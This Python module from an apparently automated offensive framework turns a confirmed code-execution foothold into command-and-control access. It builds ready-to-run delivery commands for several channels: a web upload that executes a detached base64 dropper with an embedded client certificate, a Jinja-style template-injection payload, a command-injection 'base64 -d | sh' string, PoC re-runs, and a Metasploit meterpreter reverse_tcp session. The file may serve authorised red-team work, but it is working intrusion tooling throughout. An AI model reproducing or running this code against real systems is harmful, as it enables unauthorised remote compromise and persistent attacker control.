"""delivery_kit.py — the "one channel -> one command string" family.

Extracted from ``kit.py`` (2026-11-05) as the second slice of the monolith
split. Every function here answers the same question: *given a confirmed
execution channel, what exactly do we hand the runner to execute?* Keeping
them together means a new channel (or a fix to the upload payload's
detachment) is one file, not one 5k-line file.

Bodies are unchanged. The only additions are the lazy imports of the two
helpers that still live in ``kit`` (``_pick_rce_candidate``,
``_cmdi_inject_endpoint``, ``_target_os``): importing them at module level
would close the cycle ``kit -> delivery_kit -> kit``, while at call time
``kit`` is fully loaded. ``kit`` re-exports every public name here, so all
existing imports and tests keep working.
"""
from __future__ import annotations

import os
import re
import sys

from phantom.automation.guidance.target_kit import _effective_target, _hport


def _beacon_via_rce_adapter(wm, slots):
    """Inject our beacon dropper THROUGH the confirmed RCE channel — the
    senior move that turns a confirmed code-execution primitive into
    C2 access without credentials.

    * ssti channel: template-engine RCE payload executing the dropper
      (base64 to dodge quote/space escaping).
    * msf channel: re-run the version-matched exploit module, then push
      the dropper through the opened Meterpreter session (sessions -c).
    """
    from phantom.automation.guidance.kit import (_cmdi_inject_endpoint,
                                                 _pick_rce_candidate)

    cand = _pick_rce_candidate(wm)
    if cand is None:
        raise ValueError("no confirmed RCE channel")
    beacon_cmd = slots.get("command") or ""
    if not beacon_cmd:
        raise ValueError("no beacon command to deliver")
    if cand["channel"] == "web_upload":
        import base64
        import tempfile
        import uuid
        from phantom.utils.beacon_auth import issue_client_certificate
        from phantom.utils.paths import certs_dir
        # mTLS is ON by default: the dropper's curl download from our
        # listener is rejected without a client cert. Issue a beacon client
        # certificate (signed by the listener's CA) and embed it in the
        # uploaded script so the download authenticates.
        try:
            bid = f"B-{uuid.uuid4().hex[:16].upper()}"
            mat = issue_client_certificate(bid, certs_dir())
            cert_b64 = base64.b64encode(
                mat["client_cert_pem"].encode()).decode()
            key_b64 = base64.b64encode(
                mat["client_key_pem"].encode()).decode()
        except Exception:
            cert_b64 = key_b64 = ""
        fixed = beacon_cmd
        if cert_b64 and key_b64:
            fixed = beacon_cmd.replace(
                "curl -sk ",
                "curl -sk --cert /tmp/.pcrt --key /tmp/.pkey ", 1)
        b64 = base64.b64encode(fixed.encode()).decode()
        # the upload endpoint EXECUTES .py files: upload a one-liner that
        # writes the client cert, then base64-decodes and runs the dropper.
        # The dropper is launched DETACHED: the web handler kills its
        # subprocess after a few seconds, so it must survive to finish
        # downloading/starting the beacon.
        payload = ("import base64,subprocess\n"
                   f"open('/tmp/.pcrt','wb').write("
                   f"base64.b64decode('{cert_b64}'))\n"
                   f"open('/tmp/.pkey','wb').write("
                   f"base64.b64decode('{key_b64}'))\n"
                   # argv, not a shell string: the dropper is handed to sh as
                   # ONE -c argument, so nothing in the operator-generated
                   # command can be re-split by word expansion. The detachment
                   # is stronger than the old trailing `&`: a new session plus
                   # /dev/null stdio survives the web handler reaping its own
                   # children after a few seconds (same lifetime as before).
                   f"subprocess.Popen(['/bin/sh','-c',"
                   f"'echo {b64} | base64 -d | sh'],"
                   "stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,"
                   "stderr=subprocess.DEVNULL,start_new_session=True)\n")
        with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as tf:
            tf.write(payload)
            tmp = tf.name
        target = _effective_target(wm)
        scheme = "https" if str(cand.get("port")) in ("443", "8443") else "http"
        return (f"curl -m 25 -s -F 'file=@{tmp};filename=probe.py' "
                f"{scheme}://{_hport(target, cand['port'])}/upload "
                ">/dev/null && echo PHANTOM_RCE_DELIVERED")
    if cand["channel"] == "ssti":
        import base64
        import urllib.parse
        b64 = base64.b64encode(beacon_cmd.encode()).decode()
        # base64 keeps the injected command free of quote/space escaping;
        # `base64 -d | sh` executes the dropper on the target (Linux-first).
        payload = ("{{ cycler.__init__.__globals__.os.popen("
                   f"'echo {b64} | base64 -d | sh').read() }}")
        endpoint = re.sub(
            r"\{\{.*?\}\}|\$\{.*?\}|\#\{.*?\}|<%=.*?%>",
            urllib.parse.quote(payload, safe=""),
            cand.get("endpoint") or "/")
        target = _effective_target(wm)
        return (f"curl -m 25 -s 'http://{_hport(target, cand['port'])}{endpoint}' "
                "-o /dev/null && echo PHANTOM_RCE_DELIVERED")
    if cand["channel"] == "cmdi":
        # confirmed command injection = the SHORTEST path to the beacon:
        # inject `echo <b64> | base64 -d | sh` straight into the same GET
        # param the hunt engine proved injectable — no reverse shell, no
        # staging round-trip, the dropper runs on the box immediately.
        import base64
        b64 = base64.b64encode(beacon_cmd.encode()).decode()
        endpoint = _cmdi_inject_endpoint(cand.get("endpoint") or "/",
                                         f"echo {b64} | base64 -d | sh")
        if endpoint is None:
            raise ValueError("cmdi endpoint has no injectable GET parameter")
        target = _effective_target(wm)
        return (f"curl -m 25 -s 'http://{_hport(target, cand['port'])}{endpoint}' "
                "-o /dev/null && echo PHANTOM_RCE_DELIVERED")
    if cand["channel"] == "poc":
        # A local PoC already proved command execution against this exact
        # target. Re-run it with an arbitrary command and let the runner
        # report success only if the command's output came back.
        import base64
        import shlex
        import subprocess
        cve = str(cand.get("cve") or "")
        if not cve:
            raise ValueError("local-PoC channel without CVE")
        target = _effective_target(wm)
        b64 = base64.b64encode(beacon_cmd.encode()).decode()
        if os.name == "nt":
            q = lambda value: subprocess.list2cmdline([str(value)])
        else:
            q = shlex.quote
        return (
            f"{q(sys.executable)} -m phantom.automation.exploit.poc_runner "
            f"--cve {q(cve)} --target {q(target)} "
            f"--port {q(cand.get('port') or '')} --command-b64 {q(b64)} "
            "--require-rce && echo PHANTOM_RCE_DELIVERED"
        )
    if cand["channel"] == "msf":
        return _msf_beacon_delivery(wm, cand, beacon_cmd)
    raise ValueError(f"beacon injection over channel "
                     f"{cand['channel']} not supported")


def _msf_beacon_delivery(wm, cand, beacon_cmd):
    """Deliver the beacon through a Meterpreter session: run the
    version-matched exploit module with a reverse payload, wait for the
    session, then push the dropper into it via `sessions -c`."""
    import base64

    from phantom.automation.guidance.kit import _target_os

    module = cand.get("msf_module", "")
    if not module:
        raise ValueError("RCE plan without msf module")
    target = _effective_target(wm)
    port = str(cand.get("port") or "")
    os_name = _target_os(wm).lower()
    payload = ("windows/x64/meterpreter/reverse_tcp"
               if "windows" in os_name
               else "linux/x64/meterpreter/reverse_tcp")
    from phantom.automation.exploit.execution import _msf_lhost, _msf_lport
    lhost = _msf_lhost()
    # LPORT is the Metasploit handler, NOT the C2 listener: reusing
    # c2.port made the handler fail to bind (the beacon listener owns it).
    lport = _msf_lport()
    b64 = base64.b64encode(beacon_cmd.encode()).decode()
    exec_cmd = f"echo {b64} | base64 -d | sh"
    rport = f"; set RPORT {port}" if port else ""
    return (
        f"msfconsole -q -x \"use {module}; set RHOSTS {target}{rport}; "
        f"set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; "
        f"set ExitOnSession false; run -j; sleep 25; "
        f"sessions -c '{exec_cmd}'; exit -y\" "
        f"&& echo PHANTOM_RCE_DELIVERED"
    )
